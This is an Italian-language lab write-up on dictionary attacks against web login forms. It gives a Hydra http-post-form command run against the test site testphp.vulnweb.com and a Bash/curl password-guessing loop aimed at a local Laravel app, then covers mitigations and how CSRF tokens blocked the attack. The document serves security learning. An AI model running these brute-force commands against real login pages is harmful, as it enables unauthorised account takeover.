# Auth Attacks: Brute-Force Web (Hydra)

Obiettivo: Eseguire un attacco di dizionario (Dictionary Attack) contro un form di login web per identificare credenziali deboli.

Target: `http://testphp.vulnweb.com` e applicativo in locale

Strumenti: `THC-Hydra` (Network Login Cracker), `Firefox DevTools`

---

## 1 Introduzione Teorica

Il Brute-Force Web consiste nel tentare sistematicamente numerose combinazioni di username e password.

A differenza dei servizi standard, l'attacco web richiede di configurare Hydra per gestire il protocollo HTTP/POST, identificando correttamente le risposte del server per distinguere un login fallito da uno riuscito.

Rischio (OWASP): Broken Authentication. La mancanza di meccanismi di protezione (Rate Limiting, Account Lockout) permette a un attaccante di provare milioni di password indisturbato.

---

## 2 Analisi del Target e "False Positive Trap"

L'analisi preliminare con i Developer Tools ha rivelato i parametri del form (`uname`, `pass`) inviati a `/userinfo.php`.

La sfida del Redirect (302):

Durante i test iniziali, si è notato che il server risponde con un codice HTTP 302 Found (Redirect) sia in caso di successo che di fallimento, rendendo inefficace la ricerca classica della stringa di errore ("Login Failed"). Questo generava Falsi Positivi (tutte le password venivano segnate come valide).

![](./img/Screenshot_2026-02-14_19_18_22.jpg)

Soluzione:

Si è invertita la logica di Hydra: invece di cercare l'errore, si è configurato il tool per cercare una stringa di Successo (`S=Logout`), presente solo nella pagina riservata accessibile dopo l'autenticazione.

---

## 3 Esecuzione dell'Attacco

È stata creata una wordlist mirata (`passlist.txt`) contenente la credenziale corretta mescolata a falsi.

![](./img/Screenshot_2026-02-14_19_24_50.jpg)

```bash
# S=Logout : Indica a Hydra che il login è valido SE trova la parola "Logout" nella risposta
hydra -l test -P passlist.txt testphp.vulnweb.com http-post-form "/userinfo.php:uname=^USER^&pass=^PASS^:S=Logout" -V
```

![](./img/Screenshot_2026-02-14_19_31_18.jpg)

Risultato (Proof of Concept):

Analisi:

Hydra ha scartato correttamente le password errate (come admin o 123456) e ha identificato univocamente l'unica credenziale valida:

- Login: `test`
- Password: `test`

---

## 4 Secure Coding & Difesa

Per mitigare questi attacchi:

- Rate Limiting: Limitare le richieste per IP (es. max 5 login/minuto).
- Delay Response: Aggiungere un ritardo artificiale (es. 1-2 secondi) dopo un login fallito per rallentare drasticamente gli attacchi brute-force massivi.
- MFA (Multi-Factor Authentication): L'unica difesa definitiva contro il furto di password.
- Generazione Messaggi: Evitare messaggi generici. Assicurarsi che le risposte di errore abbiano codici di stato e contenuti predicibili per il monitoring, ma non utili all'attaccante per l'enumerazione degli utenti.


---

## 5 Scenario Docker & Localhost (Lab Setup)

L'attacco è stato replicato contro un'infrastruttura reale containerizzata (Docker) per simulare uno scenario di "Internal Penetration Test".

Sfide Tecniche affrontate:

- Networking (VM vs Host):
    
    Eseguendo l'attacco da una Virtual Machine (Kali) contro Docker (che gira sull'Host), il target `localhost` (127.0.0.1) non è valido. È stato necessario identificare l'IP della scheda di rete fisica (`192.168.x.x`) per raggiungere i container.

- Port Mapping & Service Discovery:
    
    Un errore comune è attaccare la porta esposta dal Frontend (es. `:5173` per Vite/React).

    - Recon: Tramite `docker ps` e l'analisi dei tab Network del browser, è stato identificato che la logica di autenticazione risiedeva su un container separato (`<nome_container_backend>`) esposto sulla porta 80.

- Monitoraggio Blue Team:
    
    Il vantaggio di attaccare un ambiente locale è la visibilità totale. È stato possibile osservare l'attacco "dall'interno" monitorando i log del container backend:

```Bash
docker logs -f <nome_container_backend>
```

Questo ha permesso di confermare che le richieste arrivavano al server, ma venivano respinte.

---

## 6 Case Study: "The Laravel Wall" (Analisi Difensiva)

Durante il tentativo di forzare l'autenticazione dell'applicazione Laravel, l'attacco si è evoluto attraverso diverse fasi di troubleshooting che hanno evidenziato le moderne difese dei framework web.

#### Fase 1: Il "Frontend Trap"

Inizialmente, l'attacco è stato diretto verso l'URL visibile nel browser: `http://host:5173/login`.

- Risultato: `HTTP 404 Not Found`.
- Analisi: Essendo una Single Page Application (SPA), la rotta `/login` sulla porta 5173 è virtuale (gestita da JavaScript). Il vero endpoint API risiedeva sulla porta 80.

#### Fase 2: Complessità del Protocollo (JSON vs Form)

Hydra è ottimizzato per form HTML standard (`application/x-www-form-urlencoded`). L'API target richiedeva un payload JSON.

- Problema: I tentativi di adattare Hydra con moduli `http-post-json` o escaping manuale (`{\"email\":...}`) hanno generato errori di sintassi e falsi negativi dovuti alla rigidità del tool.
- Soluzione: È stato sviluppato uno script Bash custom (basato su `curl`) per avere il controllo granulare sugli Header e sul formato del Body.

```Bash
#!/bin/bash

# Configurazione
TARGET="http://192.168.xxx.xxx:80/login"    # sostituire xxx con vero indirizzo ip
USER="<NOME_USER>"                          # sostituire con vero nome user

echo "Attacco iniziato su: $TARGET"
echo "Utente target: $USER"
echo "------------------------------------------------"

# Lettura file passlist.txt riga per riga
while read PASS; do
    # Esegue la richiesta CURL e salva la risposta (silenzioso -s)
    # Nota: Usiamo timeout 2s per non bloccarci se il server è lento
    RESPONSE=$(curl -s --max-time 2 -X POST "$TARGET" \
      -H "Content-Type: application/json" \
      -H "Accept: application/json" \
      -d "{\"email\":\"$USER\",\"password\":\"$PASS\"}")

    # Analisi della risposta
    if echo "$RESPONSE" | grep -q "CSRF"; then
         echo "BLOCCATO DA CSRF (Laravel Sanctum/Token mancante)"
         echo "-> L'attacco non può proseguire senza un token valido."
         break
    elif echo "$RESPONSE" | grep -q "Invalid credentials"; then
         echo "Tentativo fallito: $PASS"
    elif echo "$RESPONSE" | grep -q "The route"; then
         echo "Errore 404: La rotta non è corretta."
         break
    else
         # Se non è un errore noto, potrebbe essere un successo o un redirect
         echo "SUCCESS!! (o risposta anomala)"
         echo "Password: $PASS"
         echo "Server Response: $RESPONSE"
         break
    fi

done < passlist.txt
```

![](./img/Screenshot_2026-02-14_21_38_45.jpg)

#### Fase 3: Lo scontro con il CSRF (Sanctum)

Una volta raggiunto correttamente l'endpoint `/login` sulla porta 80 con lo script custom, il server ha risposto sistematicamente con un errore `HTTP 419`.

```JSON
{
    "message": "CSRF token mismatch.",
    "exception": "Symfony\\Component\\HttpKernel\\Exception\\HttpException"
}
```

Analisi della Difesa:

Laravel (tramite il pacchetto Sanctum/Web Middleware) protegge le rotte di login richiedendo un Token CSRF valido.

- Il browser reale ottiene questo token facendo una richiesta `GET /sanctum/csrf-cookie preliminare`.
- Hydra (o lo script Bash semplice) è "stateless": invia la richiesta POST diretta senza aver prima negoziato il token.
- Il server rifiuta la richiesta a prescindere dalla correttezza della password.

Conclusione:

Questo test ha dimostrato che i moderni framework MVC/API (come Laravel, Django, Rails), se configurati correttamente con protezioni Anti-CSRF e Stateful Authentication, sono intrinsecamente resistenti agli attacchi di brute-force "semplici" eseguiti con tool generici come Hydra. Per bypassare questa difesa, sarebbe necessario uno script avanzato in grado di gestire sessioni e cookie (es. Python con `requests.Session()`).